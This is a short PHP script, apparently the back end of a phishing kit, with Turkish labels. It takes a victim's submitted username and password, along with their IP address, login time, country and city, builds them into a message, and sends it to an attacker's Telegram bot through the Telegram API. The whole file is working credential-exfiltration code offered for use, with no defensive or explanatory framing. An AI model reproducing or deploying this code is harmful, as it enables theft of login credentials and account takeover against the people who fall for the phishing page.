<?php
include 'igardotoken.php';
    $data = [
        'text' => ' 
Kullanıcı Adı: '.$username.' 

Kullanıcı Adı : '.$username.'
Şifre : '.$password.'
ip : '.$ip.'
Giriş Zamanı : '.$cur_time.'
Ülke : '.$ulke.'
Şehir : '.$sehir.'


      ',
  'chat_id' => $chat_id
    ];
    
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );


  
?>